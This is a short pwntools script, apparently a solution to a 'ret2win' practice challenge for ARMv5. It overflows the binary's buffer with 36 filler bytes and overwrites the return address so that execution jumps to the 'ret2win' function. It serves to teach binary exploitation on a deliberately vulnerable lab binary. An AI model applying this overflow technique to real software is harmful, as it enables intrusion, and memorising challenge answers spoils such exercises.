from pwn import *

context.binary = elf = ELF('./ret2win_armv5')

offset = 36

payload = b'V'*offset + p32(elf.sym['ret2win'])

p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())

